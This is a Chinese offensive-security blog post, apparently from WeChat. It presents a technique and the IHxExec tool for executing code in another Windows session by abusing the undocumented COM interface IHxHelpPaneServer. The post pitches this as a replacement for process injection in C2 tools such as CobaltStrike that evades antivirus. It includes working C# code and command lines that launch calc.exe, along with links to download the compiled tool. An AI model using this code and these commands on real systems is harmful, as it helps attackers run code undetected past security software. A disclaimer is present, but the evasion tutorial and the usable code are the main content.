<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/UftLua9qBd0R6cVJrvxn3Q)

> 免责声明：请勿将本项目技术或代码应用在恶意软件制作、软件著作权 / 知识产权盗取或不当牟利等非法用途中。本项目提及的技术仅可用于私人学习测试等合法场景中，任何不当利用该技术所造成的刑事、民事责任均与本项目作者无关。

本文使用工具下载地址：https://pan.quark.cn/s/6737c50e12da[1]

前言
--

众所周知，常用的 C2 工具（例如 CobaltStrike）在另一个进程上下文中执行代码经常使用的就是`inject`和`shinject`命令，这两个命令可以将代码注入到任意远程进程中。例如：

```
inject 5732 x64

```

但是进程注入方案现在已经被杀软监测得死死的，尤其是某数字公司，只有在当前进程上下文中进行注入才不会被杀。那么除了进程注入外我们是否还有其他方案能在其他进程上下文中执行代码呢？

Windows Session 的利用
-------------------

Windows Session 介绍
------------------

在介绍新工具前，我先讲一下大致的原理，核心就是利用了 Windows Session。会话（session）是由进程和其他的系统对象（比如窗口站、桌面和窗口）构成的，他们代表了一个用户的工作站登录会话。Windows 系统是支持多会话的，因此会话空间（session space）包含了一些针对每个会话的全局信息。Session 的创建一般有以下两种方式：

本地会话：用户在物理机上登录，创建一个会话。远程会话：同一用户通过远程桌面连接到同一台机器，也会创建一个新的会话。

我们可以通过输入`quser`来查询当前 Session：![](https://mmbiz.qpic.cn/mmbiz_png/AbAaoHnsh8Kf2gAVvF8twFYNkYES1HwSpuaUY5xdd4taG89s6uUibUXhQhEfRHZdoLzV5zHAlf4ObgWwQp8HdgQ/640?wx_fmt=png&from=appmsg)Windows 中 net session 的利用也可以查看这里 [2] 进行进一步了解，例如窃取 Session 来进行提权（前提是获得了 SeImpersonate 或者 SeAssignPrimaryToken 权限）。

跨会话激活技术
-------

下面我们需要了解跨会话激活技术。

### 什么是跨会话激活机制？

跨会话激活机制是指在不同的用户会话之间执行某些操作或激活某些功能。这种机制在多用户环境（如终端服务器或远程桌面服务）中尤为重要，因为不同用户的会话是隔离的。

### 常见的跨会话激活技术

**Windows 服务**：Windows 服务运行在会话 0 中，可以与其他用户会话进行交互。例如，服务可以在用户登录时启动某些进程。

**任务计划程序**：可以使用任务计划程序在特定的用户会话中执行任务。

**远程桌面服务（RDS）**：可以通过 RDS 在不同用户会话之间进行操作。

**COM 和 DCOM**：组件对象模型（COM）和分布式组件对象模型（DCOM）可以在不同会话之间进行对象调用。

**WTS APIs**：Windows 终端服务（WTS）API 提供了一组函数，用于跨会话管理和操作。

结合利用
----

如果存在 Session1 和 Session2，在 Session1 中利用跨会话激活技术来在 Session2 中执行代码，就与进程注入相差无疑了。流程为：

创建服务器会话（Session1）和客户端会话（Session2） 客户端会话是用来接收创建 COM 对象请求的会话，通过调用该 COM 对象的方法，客户端将能够在其会话中执行代码。

其中最为重要的则是如何执行代码，此处使用 P0 在 2016 年公布的一个未文档化的接口：`IHxHelpPaneServer`，该接口很有用，因为它提供了一个 Execute 方法，允许在系统上执行任意文件。使用方法为：

```
using System;
using System.Runtime.InteropServices;
namespace IHxHelpPaneServer
{
    static class Program
    {
        static void Main()
        {
            var path = "file:///C:/Windows/System32/calc.exe";
            var session = System.Diagnostics.Process.GetCurrentProcess();
            Server.execute(session.SessionId.ToString(), path); // u can change session id here
        }
    }
    static class Server
    {
        [ComImport, Guid("8cec592c-07a1-11d9-b15e-000d56bfe6ee"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IHxHelpPaneServer
        {
            void DisplayTask(string task);
            void DisplayContents(string contents);
            void DisplaySearchResults(string search);
            void Execute([MarshalAs(UnmanagedType.LPWStr)] string file);
        }
        public static void execute(string new_session_id, string path)
        {
            try
            {
                IHxHelpPaneServer server = (IHxHelpPaneServer)Marshal.BindToMoniker(String.Format("session:{0}!new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee", new_session_id)); // alert alert red flag
                Uri target = new Uri(path);
                server.Execute(target.AbsoluteUri);
            }
            catch
            {
            }
        }
    }
}

```

那么如何在其他 session 中创建 com 接口呢，可以使用`IStandartActivator + ISpecialSystemProperties`。详情查看这里 [3]。在大多数情况下，我们都并非在多 session 环境中上线的，有趣的是在单 session 环境中，我们仍可以调用此接口进行代码执行，虽然 Session 未进行切换，但是`IHxHelpPaneServer`在杀软绕过上仍然奏效（可以理解为 com 接口的滥用仍起作用）。那么这里就有两套方案：

单 session（常用情况）：

```
.\IHxExec.exe -s 1 -c C:/Windows/SYSTEM32/CALC.EXE

```

多 session：

```
.\IHxExec.exe -s 2 -c C:/Windows/SYSTEM32/CALC.EXE

```

![](https://mmbiz.qpic.cn/mmbiz_png/AbAaoHnsh8Kf2gAVvF8twFYNkYES1HwS2n6ibDEltCX4tnqWA11ylnFEmsnEqm0bqQ02PJKSeu5eYSTYlAicNdIQ/640?wx_fmt=png&from=appmsg)

[视频详情](javascript:;)

本文使用工具下载地址（已编译）：https://pan.quark.cn/s/6737c50e12da[4]  

相关项目（未编译）：https://github.com/CICADA8-Research/IHxExec[5]

> 加入我们学习群一起学习交流，一群已超过 200 人，可扫 码添加左侧运营微信发送验证” 云鸦 “进入，也可以扫码直接二群，欢迎师傅们一起学习交流，每天学习安全新知识~

![](https://mmbiz.qpic.cn/mmbiz_png/AbAaoHnsh8Kf2gAVvF8twFYNkYES1HwS69xu7suy2CwDZTdqD3JdgicQ4kC8MohdKezoof1gs8u5HqE2raZ0icBw/640?wx_fmt=png&from=appmsg)

### References

`[1]`: _https://pan.quark.cn/s/6737c50e12da_  
`[2]` 这里: _https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%ADnet-session%E7%9A%84%E5%88%A9%E7%94%A8_  
`[3]` 这里: _https://cicada-8.medium.com/process-injection-is-dead-long-live-ihxhelppaneserver-af8f20431b5d_  
`[4]`: _https://pan.quark.cn/s/6737c50e12da_  
`[5]`: _https://github.com/CICADA8-Research/IHxExec_